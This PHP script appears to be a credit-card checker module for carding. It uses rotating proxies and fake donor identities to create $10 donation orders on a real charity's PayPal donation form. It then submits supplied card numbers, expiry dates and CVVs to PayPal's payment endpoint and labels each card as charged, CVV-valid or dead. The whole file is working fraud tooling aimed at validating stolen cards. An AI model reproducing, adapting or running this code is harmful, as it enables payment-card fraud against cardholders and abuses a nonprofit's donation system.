<?php

$retry = 0;

$isRetry = False;

start:

if ($isRetry) {
	$retry++;

	$this->curlx->DeleteCookie();
}

if ($retry > 2) {
	if (empty($empty)) $empty = 'Maximum Retrys Reached';

	$status = ['emoji' => '❌', 'status' => 'DECLINED', 'msg' => "RETRY - $empty!"];

	goto end;
}

$isRetry = True;

$server = $this->proxy();

$fake = $this->tools->GetUser();

$cookie = uniqid();

$r1 = $this->curlx->Get('https://www.paypal.com/smart/buttons?style.label=paypal&style.layout=vertical&style.color=gold&style.shape=rect&style.tagline=false&style.menuPlacement=below&sdkVersion=5.0.356&components.0=buttons&components.1=hosted-fields&locale.lang=en&locale.country=GB&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVpuSTVOMjNPVUtJc1Vib3RkbVBweFFVMS1mOUltV3hNbXEwMGFwQUh1MG9IOFo0Vzl3N3VfdVBRckR6LTFwV1c1anlIYV94aFFpcERwTDgmbWVyY2hhbnQtaWQ9TTlISDVOQTZLRkxaVyZjb21wb25lbnRzPWhvc3RlZC1maWVsZHMsYnV0dG9ucyZsb2NhbGU9ZW5fR0ImZGlzYWJsZS1mdW5kaW5nPWNyZWRpdCZ2YXVsdD1mYWxzZSZpbnRlbnQ9Y2FwdHVyZSZjdXJyZW5jeT1VU0QiLCJhdHRycyI6eyJkYXRhLXBhcnRuZXItYXR0cmlidXRpb24taWQiOiJHaXZlV1BfU1BfUENQIiwiZGF0YS11aWQiOiJ1aWRfZXdna3Fjc3ZkdWFncWxsYWtiZHZmZm55c2hmZHRjIn19&clientID=AZnI5N23OUKIsUbotdmPpxQU1-f9ImWxMmq00apAHu0oH8Z4W9w7u_uPQrDz-1pWW5jyHa_xhQipDpL8&clientAccessToken=A21AAMZhtlthatSGBUC7r8a2Uxdbt1VMFg3ZJCXS6Uf7vUuhd4AG74EkjvswQGBHWHF1YJTvlWcOmpBZRejuUTiee7nwfjnlw&sdkCorrelationID=f493644434181&storageID=uid_995f3a5b22_mdm6nde6nte&sessionID=uid_c074da41cf_mdm6nde6nte&buttonSessionID=uid_be65ed3676_mdm6nde6nte&env=production&buttonSize=large&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6ZmFsc2V9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInByb2R1Y3RzIjp7InBheUluMyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlJbjQiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfSwicGF5bGF0ZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfX19LCJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJicmFuZGVkIjp0cnVlLCJpbnN0YWxsbWVudHMiOmZhbHNlLCJ2ZW5kb3JzIjp7InZpc2EiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sIm1hc3RlcmNhcmQiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImFtZXgiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImRpc2NvdmVyIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJoaXBlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6ZmFsc2V9LCJlbG8iOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOnRydWV9LCJqY2IiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOnRydWV9fSwiZ3Vlc3RFbmFibGVkIjp0cnVlfSwidmVubW8iOnsiZWxpZ2libGUiOmZhbHNlfSwiaXRhdSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJjcmVkaXQiOnsiZWxpZ2libGUiOmZhbHNlfSwiYXBwbGVwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwic2VwYSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJpZGVhbCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJiYW5jb250YWN0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImdpcm9wYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwiZXBzIjp7ImVsaWdpYmxlIjpmYWxzZX0sInNvZm9ydCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJteWJhbmsiOnsiZWxpZ2libGUiOmZhbHNlfSwicDI0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sInppbXBsZXIiOnsiZWxpZ2libGUiOmZhbHNlfSwid2VjaGF0cGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sInBheXUiOnsiZWxpZ2libGUiOmZhbHNlfSwiYmxpayI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJ0cnVzdGx5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIm94eG8iOnsiZWxpZ2libGUiOmZhbHNlfSwibWF4aW1hIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJvbGV0byI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJib2xldG9iYW5jYXJpbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJtZXJjYWRvcGFnbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJtdWx0aWJhbmNvIjp7ImVsaWdpYmxlIjpmYWxzZX0sInNhdGlzcGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX19&platform=mobile&experiment.enableVenmo=false&experiment.enableVenmoAppLabel=false&flow=purchase&currency=USD&intent=capture&commit=true&vault=false&disableFunding.0=credit&merchantID.0=M9HH5NA6KFLZW&renderedButtons.0=paypal&renderedButtons.1=card&debug=false&applePaySupport=false&supportsPopups=true&supportedNativeBrowser=true&experience=&allowBillingPayments=true', null, $cookie, $server['proxy']);

if (!$r1->success) goto start;

$bearer = $this->getstr($r1->body, 'facilitatorAccessToken":"', '"');

if (empty($bearer)) {
	$empty = 'First Request Token is Empty';

	goto start;
}

$r2 = $this->curlx->Get('https://solemen.org/give/19096-2?giveDonationFormInIframe=1', null, $cookie, $server['proxy']);

if (!$r2->success) goto start;

$hash = $this->getstr($r2->body, 'give-form-hash" value="', '"');

if (empty($hash)) {
	$empty = 'Second Request Token is Empty';

	goto start;
}

$data = [
	'give-honeypot' => '',
	'give-form-id-prefix' => '19182-1',
	'give-form-id' => '19182',
	'give-form-title' => 'Change A Life - Classic Form',
	'give-current-url' => 'https://solemen.org/Donate/',
	'give-form-url' => 'https://solemen.org/give/19096-2/',
	'give-form-minimum' => '10.00',
	'give-form-maximum' => '50000.00',
	'give-form-hash' => $hash,
	'give-price-id' => '0',
	'give-recurring-logged-in-only' => '',
	'give-logged-in-only' => '1',
	'_give_is_donation_recurring' => '0',
	'give_recurring_donation_details' => '{"give_recurring_option":"yes_donor"}',
	'give-amount' => '10.00',
	'give-cs-currency' => 'USD',
	'give-cs-base-currency' => 'USD',
	'give-cs-exchange-rate' => '0',
	'give-cs-form-currency' => 'USD',
	'give-fee-recovery-settings' => '{"fee_recovery":false}',
	'give_first' => $fake->first,
	'give_last' => $fake->last,
	'give_email' => $fake->email,
	'give_tributes_type' => 'In honor of',
	'give_tributes_show_dedication' => 'no',
	'give_tributes_radio_type' => 'In honor of',
	'give_tributes_first_name' => '',
	'give_tributes_last_name' => '',
	'payment-mode' => 'paypal-commerce',
	'give-gateway' => 'paypal-commerce',
	'give_embed_form' => '1'
];

$r3 = $this->curlx->Post('https://solemen.org/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order', http_build_query($data), null, $cookie, $server['proxy']);

if (!$r3->success) goto start;

$id = $this->getstr($r3->body, '"id":"', '"');

if (empty($id)) {
	$empty = 'Third Request Token is Empty';

	goto start;
}

$data = '{"query":"\n mutation payWithCard(\n $token: String!\n $card: CardInput!\n $phoneNumber: String\n $firstName: String\n $lastName: String\n $shippingAddress: AddressInput\n $billingAddress: AddressInput\n $email: String\n $currencyConversionType: CheckoutCurrencyConversionType\n $installmentTerm: Int\n ) {\n approveGuestPaymentWithCreditCard(\n token: $token\n card: $card\n phoneNumber: $phoneNumber\n firstName: $firstName\n lastName: $lastName\n email: $email\n shippingAddress: $shippingAddress\n billingAddress: $billingAddress\n currencyConversionType: $currencyConversionType\n installmentTerm: $installmentTerm\n ) {\n flags {\n is3DSecureRequired\n }\n cart {\n intent\n cartId\n buyer {\n userId\n auth {\n accessToken\n }\n }\n returnUrl {\n href\n }\n }\n paymentContingencies {\n threeDomainSecure {\n status\n method\n redirectUrl {\n href\n }\n parameter\n }\n }\n }\n }\n ","variables":{"token":"'.$id.'","card":{"cardNumber":"'.$cc.'","expirationDate":"'.$mm.'/'.$yyyy.'","postalCode":"10509","securityCode":"'.$cvv.'"},"phoneNumber":"2453759468","firstName":"'.$fake->first.'","lastName":"'.$fake->last.'","billingAddress":{"givenName":"'.$fake->first.'","familyName":"'.$fake->last.'","line1":null,"line2":null,"city":null,"state":null,"postalCode":"10509","country":"US"},"email":"'.$fake->email.'","currencyConversionType":"PAYPAL"},"operationName":null}';

$headers = [
	"content-type: application/json",
	'paypal-client-context: '.$id.'',
	'paypal-client-metadata-id: '.$id.'',
	'referer: https://www.paypal.com/smart/card-fields?sessionID=uid_c074da41cf_mdm6nde6nte&buttonSessionID=uid_be65ed3676_mdm6nde6nte&locale.x=en_GB&commit=true&env=production&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVpuSTVOMjNPVUtJc1Vib3RkbVBweFFVMS1mOUltV3hNbXEwMGFwQUh1MG9IOFo0Vzl3N3VfdVBRckR6LTFwV1c1anlIYV94aFFpcERwTDgmbWVyY2hhbnQtaWQ9TTlISDVOQTZLRkxaVyZjb21wb25lbnRzPWhvc3RlZC1maWVsZHMsYnV0dG9ucyZsb2NhbGU9ZW5fR0ImZGlzYWJsZS1mdW5kaW5nPWNyZWRpdCZ2YXVsdD1mYWxzZSZpbnRlbnQ9Y2FwdHVyZSZjdXJyZW5jeT1VU0QiLCJhdHRycyI6eyJkYXRhLXBhcnRuZXItYXR0cmlidXRpb24taWQiOiJHaXZlV1BfU1BfUENQIiwiZGF0YS11aWQiOiJ1aWRfZXdna3Fjc3ZkdWFncWxsYWtiZHZmZm55c2hmZHRjIn19&disable-card=&token='.$id.'',
	"x-app-name: standardcardfields",
	"x-country: US"
];

$r3 = $this->curlx->Post('https://www.paypal.com/graphql?fetch_credit_form_submit', $data, $headers, $cookie, $server['proxy']);

if (!$r3->success) goto start;

$code = empty($tmp = $this->getstr($r3->body, 'state":"', '"')) ? $this->getstr($r3->body, 'code":"', '"') : $tmp;

$code = empty($code) ? $this->getstr($r3->body, 'message":"', '"') : $code;

$err_msg = str_replace('_', ' ', $code);

if (strpos($r3->body, 'parentType":"Auth') !== false || strpos($r3->body, '"NON_PAYABLE"') !== false) {
	$status = ['status' => 'APPROVED', 'emoji' => '✅', 'msg' => 'CHARGED - Payment Successfully!'];
} elseif (strpos($r3->body, 'INVALID_BILLING_ADDRESS') !== false) {
	$status = ['status' => 'APPROVED', 'emoji' => '✅', 'msg' => "AVS FAILED - $err_msg!"];
} elseif (strpos($r3->body, 'EXISTING_ACCOUNT_RESTRICTED') !== false) {
	$status = ['status' => 'APPROVED', 'emoji' => '✅', 'msg' => "CVV CARD - $err_msg!"];
} elseif (strpos($r3->body, 'INVALID_SECURITY_CODE') !== false) {
	$status = ['status' => 'APPROVED', 'emoji' => '✅', 'msg' => "CCN CARD - $err_msg!"];
} else {
	$status = ['status' => 'DECLINED', 'emoji' => '❌', 'msg' => "DEAD - ".(empty($code) ? 'Unknown Error' : $err_msg)."!"];
}

end: